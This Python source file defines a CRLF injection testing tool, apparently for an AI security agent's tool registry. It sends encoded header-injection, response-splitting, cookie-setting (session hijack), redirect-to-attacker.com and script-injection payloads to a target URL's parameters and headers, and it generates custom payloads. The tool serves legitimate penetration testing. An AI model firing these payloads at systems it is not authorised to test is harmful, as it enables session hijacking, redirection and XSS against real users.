"""CRLF Injection testing tool for web application security."""

from __future__ import annotations

from typing import Any, Literal
from urllib.parse import quote, urlencode

import requests

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


CRLFAction = Literal["test", "test_headers", "generate", "analyze"]

# CRLF payloads with various encodings
CRLF_PAYLOADS = {
    "basic": [
        "%0d%0aInjected-Header: test",
        "%0d%0a%0d%0a<html>",
        "\r\nInjected: header",
        "%0aInjected: header",
        "%0dInjected: header",
    ],
    "double_encoded": [
        "%250d%250aInjected: header",
        "%25%30%64%25%30%61Injected: header",
    ],
    "unicode": [
        "%E5%98%8A%E5%98%8DInjected: header",
        "\\u000d\\u000aInjected: header",
    ],
    "mixed": [
        "%0d%0aSet-Cookie: session=hijacked",
        "%0d%0aLocation: https://evil.com",
        "%0d%0aX-XSS-Protection: 0",
        "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
    ],
    "log_injection": [
        "%0d%0a[ERROR] Fake log entry",
        "test%0d%0a127.0.0.1 - admin - [fake] \"GET /admin\"",
    ],
}


def _test_crlf(
    url: str,
    param: str,
    timeout: int = 10,
) -> dict[str, Any]:
    """Test for CRLF injection in URL parameters."""
    results: dict[str, Any] = {
        "url": url,
        "parameter": param,
        "vulnerable": False,
        "tests": [],
    }

    for payload_type, payloads in CRLF_PAYLOADS.items():
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"

            try:
                response = requests.get(test_url, timeout=timeout, allow_redirects=False)

                test_result: dict[str, Any] = {
                    "payload_type": payload_type,
                    "payload": payload[:50],
                    "status_code": response.status_code,
                }

                # Check for injected headers
                for header_name, header_value in response.headers.items():
                    if "injected" in header_name.lower() or "injected" in header_value.lower():
                        results["vulnerable"] = True
                        test_result["injected_header_found"] = True
                        test_result["header"] = f"{header_name}: {header_value}"

                # Check for Set-Cookie injection
                if "Set-Cookie" in response.headers:
                    if "hijacked" in response.headers.get("Set-Cookie", ""):
                        results["vulnerable"] = True
                        test_result["cookie_injection"] = True

                # Check for response splitting
                if response.status_code == 200 and "<html>" in response.text:
                    if "%0d%0a%0d%0a<html>" in payload:
                        test_result["response_splitting_indicator"] = True

                results["tests"].append(test_result)

            except requests.exceptions.RequestException as e:
                results["tests"].append({"payload": payload[:50], "error": str(e)})

    if results["vulnerable"]:
        results["severity"] = "HIGH"
        results["recommendations"] = [
            "Sanitize all user input before including in headers",
            "Use framework-provided header setting functions",
            "Implement input validation for CR/LF characters",
            "Consider URL-encoding all user input",
        ]

    return results


def _test_header_injection(
    url: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    timeout: int = 10,
) -> dict[str, Any]:
    """Test for header injection via CRLF in various headers."""
    results: dict[str, Any] = {
        "url": url,
        "vulnerable": False,
        "tests": [],
    }

    # Headers to test for injection
    test_headers = [
        "X-Forwarded-For",
        "X-Forwarded-Host",
        "User-Agent",
        "Referer",
        "Accept-Language",
        "X-Custom-Header",
    ]

    base_headers = headers or {}

    for header_name in test_headers:
        for payload_type, payloads in [("basic", CRLF_PAYLOADS["basic"][:2])]:
            for payload in payloads:
                test_headers_copy = base_headers.copy()
                test_headers_copy[header_name] = f"test{payload}"

                try:
                    response = requests.request(
                        method, url, headers=test_headers_copy, timeout=timeout
                    )

                    test_result: dict[str, Any] = {
                        "header_tested": header_name,
                        "status_code": response.status_code,
                    }

                    # Check for signs of injection
                    if "Injected" in str(response.headers):
                        results["vulnerable"] = True
                        test_result["injection_detected"] = True

                    results["tests"].append(test_result)

                except requests.exceptions.RequestException as e:
                    results["tests"].append({"header": header_name, "error": str(e)})

    return results


def _generate_payloads(
    target: str = "header",
    custom_header: str | None = None,
    custom_value: str | None = None,
) -> dict[str, Any]:
    """Generate CRLF injection payloads."""
    results: dict[str, Any] = {
        "payloads": CRLF_PAYLOADS,
    }

    if custom_header and custom_value:
        results["custom_payloads"] = [
            f"%0d%0a{custom_header}: {custom_value}",
            f"%0a{custom_header}: {custom_value}",
            f"\\r\\n{custom_header}: {custom_value}",
            f"%250d%250a{custom_header}: {custom_value}",
        ]

    # Target-specific payloads
    if target == "session":
        results["session_hijacking"] = [
            "%0d%0aSet-Cookie: session=attacker_session",
            "%0d%0aSet-Cookie: admin=true",
            "%0d%0aSet-Cookie: role=admin; Path=/",
        ]
    elif target == "redirect":
        results["redirect_payloads"] = [
            "%0d%0aLocation: https://attacker.com",
            "%0d%0aLocation: //attacker.com",
            "%0d%0aRefresh: 0;url=https://attacker.com",
        ]
    elif target == "xss":
        results["xss_payloads"] = [
            "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
            "%0d%0a%0d%0a<img src=x onerror=alert(1)>",
        ]

    return results


def _analyze_url(
    url: str,
    timeout: int = 10,
) -> dict[str, Any]:
    """Analyze URL for potential CRLF injection points."""
    results: dict[str, Any] = {
        "url": url,
        "potential_injection_points": [],
        "risk_assessment": {},
    }

    try:
        response = requests.get(url, timeout=timeout, allow_redirects=False)

        # Check if URL parameters are reflected in headers
        if "?" in url:
            results["has_parameters"] = True
            results["potential_injection_points"].append("URL parameters")

        # Check for redirect behavior
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get("Location", "")
            results["redirect_detected"] = True
            results["potential_injection_points"].append("Redirect location")

        # Check for custom headers that might be controllable
        controllable_indicators = ["x-forwarded", "x-custom", "x-original"]
        for header in response.headers:
            if any(ind in header.lower() for ind in controllable_indicators):
                results["potential_injection_points"].append(f"Header: {header}")

        # Risk assessment
        if results["potential_injection_points"]:
            results["risk_assessment"]["level"] = "MEDIUM"
            results["risk_assessment"]["recommendation"] = "Test identified injection points with CRLF payloads"
        else:
            results["risk_assessment"]["level"] = "LOW"

    except requests.exceptions.RequestException as e:
        results["error"] = str(e)

    return results


@register_tool
def crlf_injection_tester(
    action: CRLFAction,
    url: str | None = None,
    param: str | None = None,
    method: str = "GET",
    target: str = "header",
    custom_header: str | None = None,
    custom_value: str | None = None,
    headers: str | None = None,
    timeout: int = 10,
    **kwargs: Any,
) -> dict[str, Any]:
    """Test for CRLF injection vulnerabilities.

    CRLF injection allows attackers to inject HTTP headers or split responses,
    potentially enabling session hijacking, cache poisoning, or XSS.

    Args:
        action: The testing action:
            - test: Test for CRLF injection in URL parameters
            - test_headers: Test for header injection via CRLF
            - generate: Generate CRLF payloads
            - analyze: Analyze URL for injection points
        url: Target URL for testing
        param: Parameter name to test
        method: HTTP method to use
        target: Payload target for generate (header, session, redirect, xss)
        custom_header: Custom header name for payload generation
        custom_value: Custom header value for payload generation
        headers: HTTP headers as JSON string
        timeout: Request timeout in seconds

    Returns:
        CRLF injection test results with vulnerability indicators
    """
    VALID_PARAMS = {"action", "url", "param", "method", "target", "custom_header", "custom_value", "headers", "timeout"}
    VALID_ACTIONS = ["test", "test_headers", "generate", "analyze"]

    unknown_error = validate_unknown_params(kwargs, VALID_PARAMS, "crlf_injection_tester")
    if unknown_error:
        unknown_error.update(generate_usage_hint("crlf_injection_tester", "test", {"url": "https://example.com/redirect", "param": "url"}))
        return unknown_error

    action_error = validate_action_param(action, VALID_ACTIONS, "crlf_injection_tester")
    if action_error:
        return action_error

    # Parse headers
    import json
    parsed_headers = None
    if headers:
        try:
            parsed_headers = json.loads(headers)
        except json.JSONDecodeError:
            return {"error": "Invalid headers format"}

    try:
        if action == "test":
            url_error = validate_required_param(url, "url", action, "crlf_injection_tester")
            if url_error:
                return url_error
            if not param:
                return {"error": "param is required for test action"}
            return _test_crlf(url, param, timeout)

        if action == "test_headers":
            url_error = validate_required_param(url, "url", action, "crlf_injection_tester")
            if url_error:
                return url_error
            return _test_header_injection(url, method, parsed_headers, timeout)

        if action == "generate":
            return _generate_payloads(target, custom_header, custom_value)

        if action == "analyze":
            url_error = validate_required_param(url, "url", action, "crlf_injection_tester")
            if url_error:
                return url_error
            return _analyze_url(url, timeout)

        return {"error": f"Unknown action: {action}"}

    except Exception as e:
        return {"error": f"CRLF injection testing failed: {e!s}"}
